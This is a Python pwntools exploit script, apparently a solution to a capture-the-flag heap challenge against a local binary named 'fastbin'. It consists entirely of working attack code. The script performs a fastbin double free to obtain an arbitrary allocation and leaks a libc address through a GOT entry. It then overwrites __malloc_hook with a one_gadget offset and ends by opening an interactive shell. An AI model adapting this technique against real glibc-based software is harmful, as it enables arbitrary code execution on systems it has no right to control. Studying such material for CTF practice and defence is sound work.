from pwn import *

p = process('./fastbin')
context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

p.recvuntil('name')
p.send(p64(0x0) + p64(0x71) + p64(0x602100))
p.recvuntil('hello')
new(0x60,'aaa')
new(0x60,'bbb')
delete(0)
delete(1)
delete(0)
new(0x60,p64(0x602100))
new(0x60,'aaa')
new(0x60,p64(0xdeadbeef))
new(0x60,p64(0x602100) + p64(0)\
     + p64(0x602018))
show(0)
leak = u64(p.recv(6).ljust(8,'\x00'))
log.info(hex(leak))
libc_base = leak - 542016
malloc_hook = 3951376 + libc_base
new(0x60,p64(malloc_hook - 0x23) + p64(0) + p64(0x602018))
new(0x60,p64(malloc_hook - 0x23) + p64(0) + p64(0x602018))
new(0x60,'\x00' * 3 + p64(0)*2 + p64(libc_base + 0xf1207))
p.sendline('1')
p.recvuntil('size')
p.sendline('66')
p.interactive()